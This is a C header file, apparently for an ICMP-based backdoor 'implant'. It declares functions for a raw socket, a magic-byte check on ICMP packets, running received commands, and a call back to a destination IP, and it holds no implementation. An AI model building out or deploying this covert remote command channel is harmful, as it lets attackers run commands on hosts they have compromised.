#ifndef implant_H
#define implant_H

#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/icmp.h>

#define BUFFER_SIZE 1472
#define CHECK_ALLOC(x) {if (x == NULL) {fprintf(stderr, "Error: Cannot allocate memory\n"); exit(EXIT_FAILURE);}}

void implant_init_n_call(char *dest_ip);
ssize_t read_from_socket(int sockfd, unsigned char *buffer, size_t size);
int create_socket(void);
int check_magic_byte(struct icmphdr *icmp);
size_t invoke_command(unsigned char *data, unsigned char *output);
void interact(int sockfd, char *dest_ip);

#endif